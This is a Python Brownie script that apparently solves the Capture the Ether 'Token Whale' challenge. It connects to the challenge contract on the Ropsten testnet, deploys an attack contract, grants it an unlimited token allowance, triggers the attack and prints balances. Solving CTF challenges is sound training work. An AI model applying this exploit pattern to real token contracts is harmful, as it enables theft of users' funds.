from scripts.helpful_scripts import POINT_ONE, get_account, ONE
from brownie import TokenWhaleChallenge, AttackTokenWhale, network, Contract


# for local test
def deploy_contract(contract, arg=None, value=0):
    account = get_account()
    return contract.deploy(arg, {"from": account, "value": value})


def print_balances(contract, att, acc):
    print(f"balance of attack contract: {contract.balanceOf(att)}")
    print(f"balance of attacker: {contract.balanceOf(acc)}")


def main():
    # print(network.show_active())
    account = get_account()

    # for local test
    # contract = deploy_contract(TokenWhaleChallenge, account)
    # # on ropsten network
    contract_address = "0xdC8a654721E8E2BF88aa02eCa0a5f7dcd9dA8015"
    contract = Contract.from_abi(
        TokenWhaleChallenge._name,
        contract_address,
        TokenWhaleChallenge.abi,
    )

    attack_contract = deploy_contract(AttackTokenWhale, contract)
    contract.approve(attack_contract, 2 ** 256 - 1, {"from": account})
    print_balances(contract, attack_contract, account)
    attack_contract.attack({"from": account})
    print_balances(contract, attack_contract, account)
